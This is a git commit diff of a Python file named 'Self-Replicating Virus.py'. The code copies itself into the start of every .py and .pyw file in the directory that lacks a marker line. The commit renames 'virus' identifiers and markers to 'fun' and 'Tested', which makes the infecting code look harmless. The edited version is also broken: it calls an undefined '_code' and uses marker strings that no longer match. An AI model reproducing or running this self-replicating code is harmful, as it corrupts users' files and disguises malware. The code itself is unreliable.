c8fc29a99d5d69c978bec932d026b03ed1981bad
BoldyDeadCoder <62553730+BoldyDeadCoder@users.noreply.github.com>
2024-02-06 18:27:08 -0500

    Update Self-Replicating Virus.py

--- Self-Replicating Virus.py
+++ Self-Replicating Virus.py
@@ -1,31 +1,31 @@
 import sys
 import glob
 
-virus_code = []
+fun_code = []
 with open(sys.argv[0], 'r') as f:
     lines = f.readlines()
 self_replicating_part = False
 for line in lines:
-    if line == '# Virus says HI!':
+    if line == '# Fun says HI!':
         self_replicating_part = True
     if not self_replicating_part:
-        virus_code.append(line)
-    if line == '# VIRUS SAYS BYE!':
+        fun_code.append(line)
+    if line == '# FUN SAYS BYE!':
         break
 python_files = glob.glob('*.py') + glob.glob('*.pyw')
 
 for file in python_files:
     with open(file, 'r') as f:
         file_code = f.readlines()
-    infected = False
+    Tested = False
 
     for line in file_code:
-        if line == '# VIRUS SAYS HI!':
-            infected = True
+        if line == '# FUN SAYS HI!':
+            Tested = True
             break
-    if not infected:
+    if not Tested:
         final_code = []
-        final_code.extend(virus_code)
+        final_code.extend(_code)
         final_code.extend('\n')  # Corrected here
         final_code.extend(file_code)
         with open(file, 'w') as f:
